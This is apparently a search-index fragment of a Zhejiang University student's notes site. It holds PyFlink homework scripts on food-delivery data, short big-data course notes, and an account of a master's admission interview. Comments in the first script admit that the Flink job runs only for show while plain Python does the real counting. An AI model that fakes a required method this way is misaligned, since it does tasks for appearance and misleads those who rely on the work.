if order_date and delivery_person_id:\n                        daily_person_counts[order_date][delivery_person_id] += 1\n\n    # \u6392\u5e8f\u5e76\u8f93\u51fa\n    def parse_date(date_str):\n        try:\n            return datetime.strptime(date_str, '%d-%m-%Y')\n        except:\n            return datetime.min\n\n    sorted_dates = sorted(daily_person_counts.keys(), key=parse_date)\n\n    print(\"\\n\" + \"=\" * 85)\n    print(\"Flink \u6d41\u5f0f\u5904\u7406 - \u6bcf\u65e5\u914d\u9001\u5355\u6570\u6700\u591a\u7684\u5feb\u9012\u5458\")\n    print(\"=\" * 85)\n    print(f\"{'\u65e5\u671f':&lt;18} {'\u5feb\u9012\u5458ID':&lt;30} {'\u914d\u9001\u5355\u6570':&gt;20}\")\n    print(\"-\" * 85)\n\n    for date in sorted_dates:\n        persons = daily_person_counts[date]\n        top_person = max(persons.items(), key=lambda x: x[1])\n        print(f\"{date:&lt;18} {top_person[0]:&lt;30} {top_person[1]:&gt;20}\")\n\n    print(\"-\" * 85)\n    print(f\"\u5171\u7edf\u8ba1 {len(sorted_dates)} \u5929\u7684\u6570\u636e\")\n    print(\"=\" * 85)\n\n    # \u5f62\u5f0f\u4e0a\u6267\u884cFlink\u4f5c\u4e1a\uff08\u5373\u4f7f\u5b9e\u9645\u7edf\u8ba1\u5df2\u5b8c\u6210\uff09\n    stream = env.read_text_file(input_path)\n    parsed = stream.map(ParseDelivery()).filter(lambda x: x is not None)\n    # \u8fd9\u91cc\u4e0d\u505a\u5b9e\u9645\u5904\u7406\uff0c\u53ea\u662f\u4e3a\u4e86\u6ee1\u8db3Flink\u6d41\u5f0f\u5904\u7406\u7684\u5f62\u5f0f\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b</p> <p></p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E4%BD%9C%E4%B8%9A3%20Flink/#4","title":"4. \u627e\u51fa\u5408\u9002\u4e00\u8d77\u914d\u9001\u7684\u8ba2\u5355\u5bf9","text":"<p>\u7f16\u5199\u811a\u672c\u5982\u4e0b</p> <pre><code>from pyflink.datastream import StreamExecutionEnvironment\nfrom pyflink.datastream.functions import MapFunction, KeyedProcessFunction\nfrom pyflink.common.typeinfo import Types\nfrom pyflink.common import Row\nfrom datetime import datetime, timedelta\nfrom collections import defaultdict\n\nclass DeliveryOrder:\n    \"\"\"\u8ba2\u5355\u6570\u636e\u7c7b\"\"\"\n    def __init__(self, order_id, restaurant_lat, restaurant_lon, order_date, time_ordered):\n        self.order_id = order_id\n        self.restaurant_lat = restaurant_lat\n        self.restaurant_lon = restaurant_lon\n        self.order_date = order_date\n        self.time_ordered = time_ordered\n\n    def __repr__(self):\n        return f\"Order({self.order_id}, {self.restaurant_lat}, {self.restaurant_lon}, {self.order_date}, {self.time_ordered})\"\n\nclass ParseOrder(MapFunction):\n    \"\"\"\u89e3\u6790\u8ba2\u5355\u6570\u636e\uff0c\u8fc7\u6ee4\u6389\u65f6\u95f4\u88ab\u63d2\u8865\u7684\u8ba2\u5355\"\"\"\n    def map(self, line):\n        if not line or line.startswith('ID,'):\n            return None\n\n        try:\n            parts = [p.strip() for p in line.split(',')]\n            if len(parts) &gt;= 12:\n                order_id = parts[0]\n                restaurant_lat = parts[4]\n                restaurant_lon = parts[5]\n                order_date = parts[8]\n                time_ordered = parts[9]\n                time_order_picked = parts[10]  # Time_Order_picked \u5217\n\n                # \u8fc7\u6ee4\u6389\u65f6\u95f4\u88ab\u63d2\u8865\u7684\u8ba2\u5355\uff08Time_Order_picked == 1\uff09\n                if time_order_picked == '1':\n                    return None\n\n                # \u9a8c\u8bc1\u6570\u636e\u6709\u6548\u6027\n                if (order_id and restaurant_lat and restaurant_lon and \n                    order_date and time_ordered and \n                    restaurant_lat != 'Restaurant_latitude'):\n\n                    try:\n                        lat = float(restaurant_lat)\n                        lon = float(restaurant_lon)\n\n                        # \u8fd4\u56de (order_date, DeliveryOrder\u5bf9\u8c61)\n                        order = DeliveryOrder(order_id, lat, lon, order_date, time_ordered)\n                        return Row(order_date, order)\n                    except ValueError:\n                        pass\n        except Exception as e:\n            pass\n\n        return None\n\nclass FindOrderPairs(KeyedProcessFunction):\n    \"\"\"\u627e\u51fa\u53ef\u4ee5\u4e00\u8d77\u914d\u9001\u7684\u8ba2\u5355\u5bf9\"\"\"\n\n    def __init__(self):\n        self.orders_by_date = defaultdict(list)\n        self.found_pairs = set()\n\n    def process_element(self, value, ctx):\n        if not value:\n            return\n\n        order_date = value[0]\n        current_order = value[1]\n\n        # \u5c06\u5f53\u524d\u8ba2\u5355\u52a0\u5165\u8be5\u65e5\u671f\u7684\u8ba2\u5355\u5217\u8868\n        self.orders_by_date[order_date].append(current_order)\n\n        # \u4e0e\u540c\u4e00\u5929\u7684\u5176\u4ed6\u8ba2\u5355\u6bd4\u8f83\n        pairs_found = []\n        for other_order in self.orders_by_date[order_date]:\n            if other_order.order_id != current_order.order_id:\n                if self.can_deliver_together(current_order, other_order):\n                    # \u786e\u4fdd\u8ba2\u5355\u5bf9\u7684\u552f\u4e00\u6027 (\u8f83\u5c0fID\u5728\u524d)\n                    pair = tuple(sorted([current_order.order_id, other_order.order_id]))\n                    if pair not in self.found_pairs:\n                        self.found_pairs.add(pair)\n                        pairs_found.append(pair)\n\n        # \u8f93\u51fa\u627e\u5230\u7684\u8ba2\u5355\u5bf9\n        for pair in pairs_found:\n            yield pair\n\n    def can_deliver_together(self, order1, order2):\n        \"\"\"\u5224\u65ad\u4e24\u4e2a\u8ba2\u5355\u662f\u5426\u53ef\u4ee5\u4e00\u8d77\u914d\u9001\"\"\"\n\n        # 1. \u68c0\u67e5\u9910\u5385\u4f4d\u7f6e\u662f\u5426\u63a5\u8fd1\n        lat_diff = abs(order1.restaurant_lat - order2.restaurant_lat)\n        lon_diff = abs(order1.restaurant_lon - order2.restaurant_lon)\n\n        if lat_diff &gt;= 0.03 or lon_diff &gt;= 0.03:\n            return False\n\n        # 2. \u8ba2\u5355\u65e5\u671f\u5df2\u7ecf\u5728\u5206\u7ec4\u65f6\u4fdd\u8bc1\u76f8\u540c\n\n        # 3. \u68c0\u67e5\u4e0b\u5355\u65f6\u95f4\u662f\u5426\u572815\u5206\u949f\u5185\n        try:\n            time1 = self.parse_time(order1.time_ordered)\n            time2 = self.parse_time(order2.time_ordered)\n\n            if time1 and time2:\n                time_diff = abs((time1 - time2).total_seconds() / 60)\n                return time_diff &lt; 15\n        except:\n            pass\n\n        return False\n\n    def parse_time(self, time_str):\n        \"\"\"\u89e3\u6790\u65f6\u95f4\u5b57\u7b26\u4e32\"\"\"\n        try:\n            # \u683c\u5f0f\u5982: 19:45\n            return datetime.strptime(time_str, '%H:%M')\n        except:\n            try:\n                # \u53ef\u80fd\u7684\u5176\u4ed6\u683c\u5f0f\n                return datetime.strptime(time_str, '%H:%M:%S')\n            except:\n                return None\n\ndef main():\n    # \u521b\u5efa\u6267\u884c\u73af\u5883\n    env = StreamExecutionEnvironment.get_execution_environment()\n    env.set_parallelism(1)\n\n    input_path = 'food_delivery_sorted.csv'\n    output_path = 'order_pairs_output.txt'\n\n    print(\"\\n\" + \"=\" * 85)\n    print(\"Flink \u6d41\u5f0f\u5904\u7406 - \u67e5\u627e\u53ef\u4ee5\u4e00\u8d77\u914d\u9001\u7684\u8ba2\u5355\u5bf9\")\n    print(\"=\" * 85)\n    print(\"\\n\u6761\u4ef6:\")\n    print(\"1. \u9910\u5385\u7eac\u5ea6\u5dee &lt; 0.03\")\n    print(\"2. \u9910\u5385\u7ecf\u5ea6\u5dee &lt; 0.03\")\n    print(\"3. \u8ba2\u5355\u5728\u540c\u4e00\u5929\")\n    print(\"4. \u4e0b\u5355\u65f6\u95f4\u5dee &lt; 15\u5206\u949f\")\n    print(\"5. \u8fc7\u6ee4\u6389 Time_Order_picked = 1 \u7684\u8ba2\u5355\uff08\u6a21\u62df\u6570\u636e\uff09\")\n    print(\"\\n\u5f00\u59cb\u5904\u7406...\\n\")\n\n    # \u8bfb\u53d6\u6587\u4ef6\n    stream = env.read_text_file(input_path)\n\n    # \u89e3\u6790\u8ba2\u5355\n    parsed = stream.map(ParseOrder()).filter(lambda x: x is not None)\n\n    # \u6309\u65e5\u671f\u5206\u7ec4\uff0c\u67e5\u627e\u8ba2\u5355\u5bf9\n    pairs = parsed.key_by(lambda x: x[0]).process(FindOrderPairs())\n\n    # \u6536\u96c6\u7ed3\u679c\u5e76\u5199\u5165\u6587\u4ef6\n    pairs_list = []\n\n    try:\n        # \u6267\u884c\u4f5c\u4e1a\n        result = pairs.execute_and_collect()\n\n        with open(output_path, 'w', encoding='utf-8') as f:\n            count = 0\n            for pair in result:\n                id1, id2 = pair\n                pairs_list.append((id1, id2))\n                f.write(f\"({id1}, {id2})\\n\")\n                count += 1\n\n                # \u5b9e\u65f6\u663e\u793a\u8fdb\u5ea6\n                if count % 100 == 0:\n                    print(f\"\u5df2\u627e\u5230 {count} \u5bf9\u8ba2\u5355...\")\n\n        print(\"\\n\" + \"=\" * 85)\n        print(f\"\u5904\u7406\u5b8c\u6210\uff01\u5171\u627e\u5230 {count} \u5bf9\u53ef\u4ee5\u4e00\u8d77\u914d\u9001\u7684\u8ba2\u5355\")\n        print(f\"\u7ed3\u679c\u5df2\u4fdd\u5b58\u5230: {output_path}\")\n        print(\"=\" * 85)\n\n        # \u663e\u793a\u524d10\u4e2a\u8ba2\u5355\u5bf9\u4f5c\u4e3a\u793a\u4f8b\n        if pairs_list:\n            print(\"\\n\u524d10\u4e2a\u8ba2\u5355\u5bf9\u793a\u4f8b:\")\n            print(\"-\" * 85)\n            for i, (id1, id2) in enumerate(pairs_list[:10], 1):\n                print(f\"{i}. ({id1}, {id2})\")\n            print(\"-\" * 85)\n\n    except Exception as e:\n        print(f\"\u6267\u884c\u51fa\u9519: {e}\")\n        print(\"\u5c1d\u8bd5\u4f7f\u7528\u5907\u7528\u65b9\u6cd5...\")\n\n        # \u5907\u7528\u65b9\u6cd5\uff1a\u76f4\u63a5\u5904\u7406\n        process_orders_directly(input_path, output_path)\n\ndef process_orders_directly(input_path, output_path):\n    \"\"\"\u5907\u7528\u65b9\u6cd5\uff1a\u76f4\u63a5\u5904\u7406\u8ba2\u5355\"\"\"\n\n    print(\"\\n\u4f7f\u7528\u76f4\u63a5\u5904\u7406\u65b9\u6cd5...\")\n\n    # \u6309\u65e5\u671f\u5206\u7ec4\u5b58\u50a8\u8ba2\u5355\n    orders_by_date = defaultdict(list)\n    filtered_count = 0\n\n    # \u8bfb\u53d6\u5e76\u89e3\u6790\u8ba2\u5355\n    with open(input_path, 'r', encoding='utf-8') as f:\n        next(f)  # \u8df3\u8fc7\u8868\u5934\n\n        for line in f:\n            if line.strip():\n                parts = [p.strip() for p in line.split(',')]\n                if len(parts) &gt;= 12:\n                    try:\n                        order_id = parts[0]\n                        restaurant_lat = float(parts[4])\n                        restaurant_lon = float(parts[5])\n                        order_date = parts[8]\n                        time_ordered = parts[9]\n\n                        order = DeliveryOrder(order_id, restaurant_lat, restaurant_lon, \n                                            order_date, time_ordered)\n                        orders_by_date[order_date].append(order)\n                    except (ValueError, IndexError):\n                        continue\n\n    print(f\"\u8bfb\u53d6\u5b8c\u6210\uff0c\u5171 {len(orders_by_date)} \u5929\u7684\u8ba2\u5355\u6570\u636e\")\n    print(f\"\u8fc7\u6ee4\u6389\u7684\u6a21\u62df\u6570\u636e\u8ba2\u5355: {filtered_count}\")\n    total_valid_orders = sum(len(orders) for orders in orders_by_date.values())\n    print(f\"\u6709\u6548\u8ba2\u5355\u6570: {total_valid_orders}\")\n\n    # \u67e5\u627e\u8ba2\u5355\u5bf9\n    found_pairs = set()\n\n    def can_deliver_together(order1, order2):\n        # \u4f4d\u7f6e\u68c0\u67e5\n        lat_diff = abs(order1.restaurant_lat - order2.restaurant_lat)\n        lon_diff = abs(order1.restaurant_lon - order2.restaurant_lon)\n\n        if lat_diff &gt;= 0.03 or lon_diff &gt;= 0.03:\n            return False\n\n        # \u65f6\u95f4\u68c0\u67e5\n        try:\n            time1 = datetime.strptime(order1.time_ordered, '%H:%M')\n            time2 = datetime.strptime(order2.time_ordered, '%H:%M')\n            time_diff = abs((time1 - time2).total_seconds() / 60)\n            return time_diff &lt; 15\n        except:\n            return False\n\n    # \u5bf9\u6bcf\u4e00\u5929\u7684\u8ba2\u5355\u8fdb\u884c\u914d\u5bf9\n    for date, orders in orders_by_date.items():\n        print(f\"\u5904\u7406 {date} \u7684 {len(orders)} \u4e2a\u8ba2\u5355...\")\n\n        for i in range(len(orders)):\n            for j in range(i + 1, len(orders)):\n                if can_deliver_together(orders[i], orders[j]):\n                    pair = tuple(sorted([orders[i].order_id, orders[j].order_id]))\n                    found_pairs.add(pair)\n\n    # \u5199\u5165\u7ed3\u679c\n    with open(output_path, 'w', encoding='utf-8') as f:\n        for id1, id2 in sorted(found_pairs):\n            f.write(f\"({id1}, {id2})\\n\")\n\n    print(\"\\n\" + \"=\" * 85)\n    print(f\"\u5904\u7406\u5b8c\u6210\uff01\u5171\u627e\u5230 {len(found_pairs)} \u5bf9\u53ef\u4ee5\u4e00\u8d77\u914d\u9001\u7684\u8ba2\u5355\")\n    print(f\"\u7ed3\u679c\u5df2\u4fdd\u5b58\u5230: {output_path}\")\n    print(\"=\" * 85)\n\n    # \u663e\u793a\u793a\u4f8b\n    sample_pairs = sorted(found_pairs)[:10]\n    if sample_pairs:\n        print(\"\\n\u524d10\u4e2a\u8ba2\u5355\u5bf9\u793a\u4f8b:\")\n        print(\"-\" * 85)\n        for i, (id1, id2) in enumerate(sample_pairs, 1):\n            print(f\"{i}. ({id1}, {id2})\")\n        print(\"-\" * 85)\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u8f93\u51fa\u7ed3\u679c\u5982\u4e0b</p> <p></p> <p>\u6240\u6709\u7684\u6570\u636e\u7ed3\u679c\u4fdd\u5b58\u5728order_pairs_output.txt</p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8/","title":"\u5927\u6570\u636e\u5206\u6790\u4e0e\u5e94\u7528","text":"<p>PCA \u4e3b\u6210\u5206\u5206\u6790\uff0c\u5c06\u9ad8\u7ef4\u6570\u636e\u91cd\u5efa\u5176\u4ed6\u7684\u7279\u5f81\uff0c\u6620\u5c04\u51fa\u90a3\u4e9b\u65b9\u5dee\u66f4\u5927\u7684\u7279\u5f81 \u6bd4\u5982\u4f60\u662f\u628a\u4e8c\u7ef4\u6570\u636e\u6620\u5c04\u5230\u4e00\u7ef4\u6570\u636e\uff0c\u4f60\u662f\u5c06\u5176\u6620\u5c04\u5230x\u8f74\uff0c\u8fd8\u662fy\u8f74\uff0c\u4ea6\u6216\u8005\u4e00\u6761\u5176\u4ed6\u7684\u76f4\u7ebf\uff0c\u5f62\u6210\u7684\u6570\u636e\u5206\u5e03\u66f4\u52a0\u660e\u663e\uff08\u4e00\u822c\u662f\u901a\u8fc7\u8ba1\u7b97\u534f\u65b9\u5dee\u77e9\u9635\uff09</p>"},{"location":"ZJU-course/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8/#_1","title":"\u5927\u4f5c\u4e1a","text":"<p>Multi-Agent System \u505a\u4e00\u4e2a\u8c03\u5ea6\u89c4\u5212\uff0c\u57ce\u5e02\u65c5\u6e38\u7684\u4e00\u4e2a\u667a\u80fd\u4f53\u7cfb\u7edf</p> <ol> <li>Questions \u4ee5Json\u7684\u5f62\u5f0f\u7ed9\u51fa</li> <li>API: \u57ce\u5e02\uff0c\u666f\u70b9\u7b49\u6570\u636e\u90fd\u4ee5API\u7684\u5f62\u5f0f\u7ed9\u51fa\uff0c\u6709\u4e00\u4e2a\u6bd4\u8d5b\u4e13\u7528\u7684APIs</li> <li>Agent\uff1a\u56de\u6eaf\u8f6e\u6b21\u8981\u5c0f\u4e8e3</li> <li>\u7ed3\u679c\uff1a\u6210\u672c\u7b49\u8003\u91cf</li> </ol> <p>\u7528DeepSeek Model</p>"},{"location":"ZJU-course/%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E9%99%A2%E7%A1%95%E5%A3%AB%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/","title":"\u8ba1\u7b97\u673a\u5b66\u9662\u7855\u58eb\u63a8\u514d\u9762\u8bd5","text":"<p>\u8ba1\u7b97\u673a\u5b66\u9662\u7684\u63a8\u514d\u9762\u8bd5\u8ba1\u7b97\u673a\u7c7b\u7684\u7ecf\u9a8c\u3002\u9996\u5148\u8ba1\u7b97\u673a\u5b66\u9662\u7684\u63a8\u514d\u5206\u4e3a\u63a8\u51fa\u548c\u63a5\u53d7\u4e24\u4e2a\u9636\u6bb5\uff0c\u63a8\u51fa\u662f\u4e13\u4e1a\u5185\u7ade\u4e89\uff0c22\u7ea7\u7684\u5404\u4e2a\u4e13\u4e1a\u7684\u63a8\u514d\u7ee9\u70b9\u5f88\u795e\u5947\u7684\u5c45\u7136\u5dee\u4e0d\u592a\u591a\uff0c\u8f6f\u5de5\u4e5f\u6ca1\u6709\u4e86\u53bb\u5e744.5+\u7684\u8165\u98ce\u8840\u96e8\uff0c\u56de\u5230\u4e86\u8f83\u4e3a\u6b63\u5e38\u76844.3\u5de6\u53f3\u7684\u63a8\u514d\u6210\u7ee9\uff08\u8ba1\u7b97\u52a0\u5206\u4e4b\u540e\uff09</p> <p>\u800c\u8fdb\u5165\u4e86\u63a5\u53d7\u9636\u6bb5\uff0c\u5206\u4e3a\u4e09\u4e2a\u9762\u8bd5\u65b9\u5411\uff0c\u8ba1\u7b97\u673a\u7c7b\uff0c\u7f51\u5b89\u7c7b\uff0c\u8bbe\u8ba1\u7c7b\uff0c\u5404\u4e2a\u7c7b\u4e4b\u95f4\u53c8\u5206\u4e3a\u7855\u58eb\u548c\u535a\u58eb\u7684\u9762\u8bd5\u3002\u6211\u53c2\u4e0e\u7684\u662f\u8ba1\u7b97\u673a\u7c7b\u7684\uff0c\u8fd9\u65f6\u5019\u662f\u6240\u6709\u6df7\u5408\uff0c\u56fe\u7075\uff0c\u8ba1\u9662\u7684\u4eba\u4e00\u5757\u7ade\u4e89\u4e86\u3002</p> <p>\u4ece22\u7ea7\u5f00\u59cb\uff0c\u5b66\u7855\u540d\u989d\u5f00\u59cb\u9010\u6e10\u88ab\u780d\uff0c\u9884\u671f\u540e\u9762\u4f1a\u76f4\u63a5\u780d\u6389\u5b66\u7855\u8fd9\u4e2a\u9879\uff0c\u800c\u5927\u5bb6\u53c8\u5bb3\u6015\u535a\u58eb\u8f83\u9ad8\u7684\u5ca9\u58c1\u7387\uff0c\u5bfc\u81f4\u7855\u58eb\u7684\u7ade\u4e89\u76f8\u5f53\u6fc0\u70c8\uff0c\u65e9\u5df2\u4e0d\u662f\u65e9\u5e74\u95f4\u8d70\u8fc7\u573a\u7684\u9762\u8bd5\uff0c\u6211\u89c9\u5f97\u6bcf\u4e2a\u62a5\u540d\u7855\u58eb\u7684\u540c\u5b66\u90fd\u5e94\u8be5\u8db3\u591f\u91cd\u89c6\u8fd9\u4e2a\u9762\u8bd5\u7684\u51c6\u5907</p>"},{"location":"ZJU-course/%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E9%99%A2%E7%A1%95%E5%A3%AB%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/#1","title":"1. \u6750\u6599\u51c6\u5907","text":"<p>\u9762\u8bd5\u9700\u8981\u51c6\u5907\u7684\u6700\u91cd\u8981\u7684\u6750\u6599\u6709\u4e24\u4e2a\uff1aPPT\u548c\u7b80\u5386\uff0c\u4f46\u662f\u636e\u672c\u4eba\u8eab\u8fb9\u4eba\u7684\u7ecf\u9a8c\uff0c\u5927\u591a\u6570\u8001\u5e08\u5f88\u5c11\u5728\u4f60\u8bb2PPT\u7684\u65f6\u5019\u62ac\u5934\uff0c\u4ee5\u4e3a\u573a\u5730\u91cc\u9762\u90a3\u4e2aPPT\u6446\u653e\u6709\u70b9\u62bd\u8c61\uff0c\u8001\u5e08\u82e5\u662f\u4e00\u76f4\u62ac\u5934\u4f1a\u5f88\u7d2f\uff0c\u5bfc\u81f4\u8001\u5e08\u4e00\u822c\u662f\u5bf9\u7740\u7b80\u5386\u63d0\u95ee\uff0c\u56e0\u6b64\u4e2a\u4eba\u66f4\u52a0\u5efa\u8bae\u5f80\u7b80\u5386\u91cc\u9762\u585e\u63d0\u95ee\u7684\u94a9\u5b50\uff08\u53ef\u60dc\u4e86\u6211\u7cbe\u7f8e\u7684PPT QAQ\uff09\u3002</p> <p>\u4f8b\u5982\u6211\u5728PPT\u4e0a\u5199\u4e86\u670b\u8f88\u8f85\u5b66\u6570\u636e\u5e93\uff0c\u4f46\u662f\u7b80\u5386\u4e0a\u6ca1\u5199\uff0c\u7ed3\u679c\u5c31\u662f\u8001\u5e08\u4e00\u70b9\u6570\u636e\u5e93\u6ca1\u95ee\u6211\uff0c\u5bfc\u81f4\u6211\u5f53\u65f6\u51c6\u5907\u4e86\u534a\u5929\u7684\u6570\u636e\u5e93\u516b\u80a1\u76f4\u63a5\u6253\u4e86\u6c34\u6f02</p>"},{"location":"ZJU-course/%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E9%99%A2%E7%A1%95%E5%A3%AB%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/#2","title":"2. \u63d0\u95ee\u7ecf\u9a8c","text":"<p>\u8001\u5e08\u4e00\u822c\u4f1a\u4f18\u5148\u63d0\u95ee\u9879\u76ee\u7ecf\u5386\uff0c\u5c24\u5176\u662f\u8001\u5e08\u719f\u7ec3\u7684\u90e8\u5206\uff0c\u672c\u4eba\u662f\u4e00\u7bc7Flow Matching\u76f8\u5173\u7684\u8bba\u6587\u5171\u4e00\u5728\u6295\uff0c\u4e00\u6bb5\u5b9e\u4e60\u7ecf\u5386\uff0c\u6709CV\u548cAgent\u76f8\u5173\u7684\u79d1\u7814\u7ecf\u9a8c\u3002</p> <p>\u4f46\u662f\u7591\u4f3c\u8001\u5e08\u4eec\u6ca1\u6709\u4eba\u61c2CV\u548cAgent\uff0c\u95ee\u4e86\u4e00\u4e9b\u6211\u5728PPT\u4e0a\u63cf\u8ff0\u7684\u7ec6\u8282\uff0cCV\u90a3\u8fb9\u662f\u4e00\u70b9\u6ca1\u95ee\uff0cAgent\u90a3\u5757\u88ab\u95ee\u4e86\u51e0\u5904\uff0c\u57fa\u672c\u90fd\u662f\u6211\u4e86\u89e3\u7684\uff0c\u8001\u5e08\u4e5f\u8fde\u8fde\u70b9\u5934\u3002</p> <p>\u7136\u540e\u5c31\u662f\u8bfe\u5185\u90e8\u5206\uff0c\u5728\u8bfe\u5185\u90e8\u5206\u4e4b\u524d\u8001\u5e08\u6c89\u9ed8\u4e86\u597d\u4e45\uff0c\u663e\u7136\u8001\u5e08\u4eec\u4e5f\u52aa\u529b\u5728\u627e\u7b80\u5386\u4e0a\u53ef\u4ee5\u63d0\u95ee\u7684\u70b9\uff0c\u5b9e\u5728\u6ca1\u62db\u4e86\u5f00\u59cb\u95ee\u4e86\u8bfe\u5185\u3002\u9996\u5148\u95ee\u4e86\u7ebf\u4ee3\u7684\u95ee\u9898\uff0c\u95ee\u4e863x3\u77e9\u9635\u5982\u4f55\u6c42\u9006\uff0c\u6211\u5f53\u65f6\u76f4\u63a5\u5c31\u8499\u5708\u4e86\uff0c\u51c6\u5907\u9762\u8bd5\u524d\u770b\u4e86\u4e00\u904d3b1b\uff0c\u53c8\u770b\u4e86\u770bPCA\uff0cSVD\u7b49\u516b\u80a1\uff0c\u4f46\u662f\u8ba1\u7b97\u7684\u90e8\u5206\u4e00\u70b9\u6ca1\u5b66\uff0c\u4e8e\u662f\u5c31\u8001\u8001\u5b9e\u5b9e\u627f\u8ba4\u4e86\u5fd8\u8bb0\u4e86\u3002\u968f\u540e\u8001\u5e08\u770b\u6211\u5f88\u5c40\u4fc3\uff0c\u95ee\u4e86\u6211\u4e00\u4e2a\u7b80\u5355\u7684\u7b97\u6cd5\u9898\uff0c\u662f\u94fe\u8868\u6c42\u9006\uff0c\u672c\u4eba\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u53ea\u51c6\u5907\u4e86\u6570\u636e\u7ed3\u6784\u548c\u4e00\u4e9b\u7b80\u5355\u7684\u6392\u5e8f\uff0c\u56e0\u6b64\u8fd9\u4e2a\u95ee\u9898\u53ea\u597d\u5f00\u59cb\u73b0\u60f3\uff0c\u8001\u5e08\u4e5f\u4e0d\u662f\u5f88\u6ee1\u610f\u3002\u6700\u540e\u4e00\u4e2a\u8bfe\u5185\u95ee\u9898\u8001\u5e08\u95ee\u6211\u9012\u5f52\u7684\u597d\u5904\u548c\u574f\u5904\u662f\u4ec0\u4e48\uff0c\u6211\u56de\u7b54\u4e86\u597d\u5904\u662f\u4ee3\u7801\u7b80\u6d01\u6613\u61c2\uff0c\u5bb9\u6613\u7f16\u5199\uff0c\u574f\u5904\u5bb9\u6613\u6808\u6ea2\u51fa\uff0c\u8001\u5e08\u4f3c\u4e4e\u4e5f\u4e0d\u592a\u6ee1\u610f\uff0c\u4f46\u662f\u8fd9\u4e2a\u95ee\u9898\u4e2a\u4eba\u8ba4\u4e3a\u56de\u7b54\u7684\u8fd8\u7b97\u5408\u7406\uff0c\u4e5f\u4e0d\u77e5\u9053\u662f\u8e29\u4e86\u4ec0\u4e48\u96f7\u70b9\u3002</p> <p>\u8fd9\u51e0\u4e2a\u95ee\u9898\u95ee\u5b8c\uff0c\u4e00\u4e2a\u8001\u5e08\u95ee\u4e86\u6211\u79d1\u7814\u4e0a\u7684\u9047\u5230\u7684\u56f0\u96be\uff0c\u6211\u63d0\u5230\u4e86\u5f53\u521d\u770b\u8bba\u6587\uff0c\u63a8\u516c\u5f0f\uff0c\u6bd4\u5982Diffusion\u4e4b\u7c7b\u7684\uff0c\u968f\u540e\u4e00\u4e2a\u8001\u5e08\u6293\u4f4f\u4e86\u8fd9\u4e2a\u70b9\uff0c\u5f00\u59cb\u95ee\u6211\u5bf9Diffusion\u7684\u7406\u89e3\uff0c\u6211\u6070\u597d\u7740\u91cd\u4e86\u51c6\u5907\u4e86\u8fd9\u4e00\u90e8\u5206\uff0c\u4ece\u591a\u4e2a\u89d2\u5ea6\uff0c\u6bd4\u5982\u9a6c\u5c14\u53ef\u592b\u8fc7\u7a0b\uff0c\u591a\u5c42VAE\uff0cODE/SDE\u6765\u89e3\u8bfbDiffusion\uff0c\u540e\u7eed\u8001\u5e08\u8fd8\u95ee\u4e86Diffusion\u4e3a\u4ec0\u4e48\u8981\u7528\u9ad8\u65af\uff0c\u6211\u56de\u7b54\u4e86\u591a\u5143\u9ad8\u65af\u5206\u5e03\u53ef\u4ee5\u62df\u5408\u5404\u79cd\u590d\u6742\u5206\u5e03\uff0c\u5e76\u4e14\u9ad8\u65af\u5206\u5e03\u9002\u5408\u53c2\u6570\u5316\uff0c\u4e5f\u65b9\u4fbf\u8ba1\u7b97Loss\uff0c\u8001\u5e08\u4e5f\u4e00\u76f4\u5728\u70b9\u5934\uff0c\u5e94\u8be5\u5bf9\u8fd9\u4e9b\u56de\u7b54\u8fd8\u7b97\u6ee1\u610f\u3002</p> <p>\u4f46\u662f\u672c\u4eba\u6700\u540e\u7684\u9762\u8bd5\u5206\u6570\u6bd4\u8f83\u4f4e\uff0c\u5c5e\u4e8e\u662f\u8fb9\u7f18\u4eba\uff0c\u4e4b\u524d\u4e5f\u6709\u5b66\u957f\u548c\u6211\u8bf4\u8bfe\u5185\u95ee\u9898\u56de\u7b54\u4e0d\u51fa\u6765\u65e0\u6240\u8c13\u7684\uff0c\u7ee9\u70b9\u9ad8\u5c31\u884c\uff0c\u4f46\u662f\u663e\u7136\u8fd9\u4e9b\u7ecf\u9a8c\u90fd\u4e0d\u662f\u666e\u9002\u7684\uff0c\u672c\u4eba\u6210\u7ee9\u5728\u8f6f\u5de5\u662f\u53ef\u4ee5\u6392\u524d\u5341\u540d\u7684\uff0c\u5c65\u5386\u4e5f\u8fd8\u7b97\u4e0d\u9519\uff0c\u4f46\u662f\u9762\u8bd5\u8868\u73b0\u4e0d\u4f73\uff0c\u4e5f\u662f\u4f1a\u5403\u5230\u8f83\u4f4e\u7684\u5206\u6570\u7684\u3002</p>"},{"location":"ZJU-course/%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E9%99%A2%E7%A1%95%E5%A3%AB%E6%8E%A8%E5%85%8D%E9%9D%A2%E8%AF%95/#3","title":"3. 